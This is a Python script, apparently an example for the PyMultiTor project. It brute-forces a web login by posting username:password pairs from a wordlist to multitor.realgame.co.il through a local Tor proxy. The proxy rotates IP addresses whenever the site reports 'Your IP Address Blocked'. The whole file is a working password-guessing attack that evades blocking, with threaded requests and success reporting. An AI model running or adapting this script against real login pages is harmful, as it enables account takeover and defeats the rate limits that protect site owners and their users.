import socket
import requests
from os import path
from time import sleep
from multiprocessing import Process
from multiprocessing.pool import ThreadPool
from importlib.machinery import SourceFileLoader

__folder__ = path.dirname(__file__)


def check_pymultitor(address='127.0.0.1', port=8080):
    s = socket.socket()
    try:
        s.connect((address, port))
        return True
    except socket.error:
        return False


def execute_pymultitor():
    pymultitor_path = path.abspath(path.join(__folder__, '..', '..', 'pymultitor.py'))
    pymultitor_module = SourceFileLoader('pymultitor', pymultitor_path).load_module("pymultitor")
    process = Process(target=pymultitor_module.main, kwargs={
        'args': ['-d', '-p', '5', '--on-regex', 'Your\s+IP\s+Address\s+Blocked']
    })
    process.start()

    while not check_pymultitor():
        sleep(1)

    return process


def iter_credentials(size=0):
    with open(path.join(__folder__, 'john.txt')) as credentials_file:
        credentials = credentials_file.readlines()
        for i, credentials in enumerate(credentials):
            if size and i >= size:
                break
            yield credentials.rstrip('\n').split(':')


def auth(username, password, session=requests.Session()):
    res = session.post(
        url='http://multitor.realgame.co.il/login',
        data={
            'username': username,
            'password': password,
        },
        proxies={'http': '127.0.0.1:8080'}
    )
    auth_res = str.encode('Successfully login!') in res.content
    return auth_res, username, password


def callback(res):
    auth_res, username, password = res
    if auth_res:
        print("Username: %s, Password: %s -> Success :)" % (username, password))
        return
    print("Username: %s, Password: %s -> Fail :(" % (username, password))


if __name__ == '__main__':
    process = execute_pymultitor()

    username = 'test'
    pool = ThreadPool(5)
    for credentials in iter_credentials(size=20):
        pool.apply_async(auth, args=credentials, callback=callback)
    pool.close()
    pool.join()

    process.terminate()
    process.join()
